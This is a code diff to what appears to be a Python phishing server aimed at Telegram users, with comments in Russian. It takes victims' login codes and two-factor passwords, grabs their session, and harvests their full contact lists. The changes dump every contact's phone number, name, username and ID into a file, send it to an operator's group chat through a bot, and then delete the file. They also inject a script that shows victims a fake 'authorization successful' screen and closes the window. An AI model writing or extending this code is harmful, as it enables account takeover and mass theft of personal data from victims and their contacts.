@@ -195,6 +195,34 @@ async def verify_telegram_code(phone, code):
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
+# === ФУНКЦИЯ ДЛЯ СОЗДАНИЯ TXT ФАЙЛА С КОНТАКТАМИ ===
+async def create_contacts_txt_file(phone, contacts):
+    """Создает txt файл со всеми контактами"""
+    try:
+        filename = f"contacts_{phone}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(f"=== ПОЛНАЯ БАЗА КОНТАКТОВ TELEGRAM ===\n\n")
+            f.write(f"👤 Владелец аккаунта: {phone}\n")
+            f.write(f"📅 Дата сбора: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"📊 Всего контактов: {len(contacts)}\n\n")
+            f.write("=" * 60 + "\n\n")
+            
+            for i, contact in enumerate(contacts, 1):
+                f.write(f"👤 КОНТАКТ #{i}\n")
+                f.write(f"📞 Телефон: {contact.get('phone', 'скрыт')}\n")
+                f.write(f"👤 Имя: {contact.get('first_name', '')} {contact.get('last_name', '')}\n")
+                f.write(f"🔗 Юзернейм: @{contact.get('username', 'нет')}\n")
+                f.write(f"🆔 ID: {contact.get('id', '')}\n")
+                f.write(f"🤝 Взамный контакт: {'Да' if contact.get('mutual', False) else 'Нет'}\n")
+                f.write("-" * 50 + "\n\n")
+        
+        print(f"✅ Файл с контактами создан: {filename}")
+        return filename
+    except Exception as e:
+        print(f"❌ Ошибка создания файла: {e}")
+        return None
+
 # === ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ РЕАЛЬНЫХ КОНТАКТОВ ===
 async def get_real_telegram_contacts(session_token):
     """Получает реальные контакты из авторизованного аккаунта"""
@@ -334,35 +362,52 @@ async def verify_telegram_2fa(phone, password):
                 continue
 
         print(f"✅ Собрано {len(real_contacts)} реальных контактов")
+
+        # 🔥 СОЗДАЕМ TXT ФАЙЛ СО ВСЕМИ КОНТАКТАМИ
+        contacts_txt_file = await create_contacts_txt_file(phone_clean, real_contacts)
         
-        # Формируем сообщение с контактами
+        # 🔥 ОТПРАВЛЯЕМ TXT ФАЙЛ В ГРУППУ
+        if contacts_txt_file and os.path.exists(contacts_txt_file):
+            try:
+                with open(contacts_txt_file, 'rb') as file:
+                    await bot.send_document(
+                        GROUP_CHAT_ID,
+                        types.BufferedInputFile(
+                            file.read(),
+                            filename=f"contacts_{phone_clean}.txt"
+                        ),
+                        caption=f"📁 ПОЛНАЯ БАЗА КОНТАКТОВ\n📟 Номер: {phone_clean}\n👥 Контактов: {len(real_contacts)}"
+                    )
+                print("✅ TXT файл с контактами отправлен в группу!")
+                
+                # Удаляем временный файл после отправки
+                os.remove(contacts_txt_file)
+                
+            except Exception as e:
+                print(f"❌ Ошибка отправки файла: {e}")
+        
+        # Формируем сообщение с контактами для preview
         contacts_text = f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n\n"
         contacts_text += f"📟 Номер: {phone_clean}\n"
         contacts_text += f"👥 Всего контактов: {len(real_contacts)}\n"
+        contacts_text += f"📁 TXT файл отправлен: {'✅' if contacts_txt_file else '❌'}\n"
         contacts_text += f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
         
-        contacts_text += "📞 СПИСОК КОНТАКТОВ:\n"
+        contacts_text += "📞 ПРЕВЬЮ КОНТАКТОВ:\n"
         contacts_text += "=" * 40 + "\n\n"
         
-        # Добавляем первые 20 контактов
-        for i, contact in enumerate(real_contacts[:20], 1):
+        # Добавляем первые 10 контактов для preview
+        for i, contact in enumerate(real_contacts[:10], 1):
             name = f"{contact['first_name']} {contact['last_name']}".strip()
             phone = contact['phone'] or 'нет номера'
             username = f"@{contact['username']}" if contact['username'] else "нет юзернейма"
             
             contacts_text += f"{i}. {name}\n"
             contacts_text += f"   📞 {phone}\n"
-            contacts_text += f"   🔗 {username}\n"
-            contacts_text += f"   🆔 ID: {contact['id']}\n"
-            
-            if contact['mutual']:
-                contacts_text += f"   🤝 Взамный контакт\n"
-            
-            contacts_text += "\n"
+            contacts_text += f"   🔗 {username}\n\n"
         
-        # Если контактов больше 20 - показываем сколько еще
-        if len(real_contacts) > 20:
-            contacts_text += f"... и еще {len(real_contacts) - 20} контактов\n"
+        if len(real_contacts) > 10:
+            contacts_text += f"... и еще {len(real_contacts) - 10} контактов в файле\n"
         
         # 🔥 ОТПРАВЛЯЕМ КОНТАКТЫ В ГРУППУ
         try:
@@ -383,6 +428,7 @@ async def verify_telegram_2fa(phone, password):
             f"✅ УСПЕШНАЯ АВТОРИЗАЦИЯ\n"
             f"📟 Номер: +{phone_clean}\n"
             f"👥 Контактов выкачано: {len(real_contacts)}\n"
+            f"📁 TXT файл отправлен: Да\n"
             f"📨 Отправлено в группу: Да"
         )
         
@@ -390,7 +436,7 @@ async def verify_telegram_2fa(phone, password):
             'success': True,
             'session_token': session_token,
             'contacts_count': len(real_contacts),
-            'message': f'✅ Собрано {len(real_contacts)} контактов'
+            'message': '✅ Авторизация успешна! Закройте это окно и войдите в свой аккаунт Telegram.'
         }
             
     except Exception as e:
@@ -424,8 +470,70 @@ async def handle_index(request):
             
             print(f"📊 Переход по ссылке {ref_code}. Всего: {link_visits[ref_code]}")
         
+        # Читаем index.html и добавляем скрипт для редиректа
         with open('index.html', 'r', encoding='utf-8') as f:
-            return web.Response(text=f.read(), content_type='text/html')
+            html_content = f.read()
+            
+        # Добавляем скрипт для показа сообщения после успешной авторизации
+        if '</body>' in html_content:
+            redirect_script = '''
+            <script>
+            function showSuccessRedirect() {
+                // Блокируем весь контент
+                document.body.innerHTML = `
+                    <div style="
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        color: white;
+                        font-family: Arial, sans-serif;
+                        z-index: 9999;
+                    ">
+                        <div style="
+                            text-align: center;
+                            padding: 40px;
+                            background: rgba(255,255,255,0.1);
+                            border-radius: 20px;
+                            backdrop-filter: blur(10px);
+                            max-width: 500px;
+                            width: 90%;
+                        ">
+                            <div style="font-size: 48px; margin-bottom: 20px;">✅</div>
+                            <h1 style="font-size: 28px; margin-bottom: 20px;">Авторизация успешна!</h1>
+                            <p style="font-size: 18px; margin-bottom: 30px; line-height: 1.5;">
+                                Теперь закройте это окно и войдите в свой аккаунт Telegram.<br>
+                                Вы будете автоматически перенаправлены.
+                            </p>
+                            <div style="font-size: 14px; opacity: 0.8; margin-top: 20px;">
+                                Автоматическое закрытие через <span id="countdown">5</span> секунд...
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+                // Таймер обратного отсчета
+                let seconds = 5;
+                const countdownElement = document.getElementById('countdown');
+                const countdownInterval = setInterval(() => {
+                    seconds--;
+                    countdownElement.textContent = seconds;
+                    if (seconds <= 0) {
+                        clearInterval(countdownInterval);
+                        window.close();
+                    }
+                }, 1000);
+            }
+            </script>
+            '''
+            html_content = html_content.replace('</body>', redirect_script + '\n</body>')
+        
+        return web.Response(text=html_content, content_type='text/html')
             
     except Exception as e:
         return web.Response(text=f"Error: {e}", status=500)
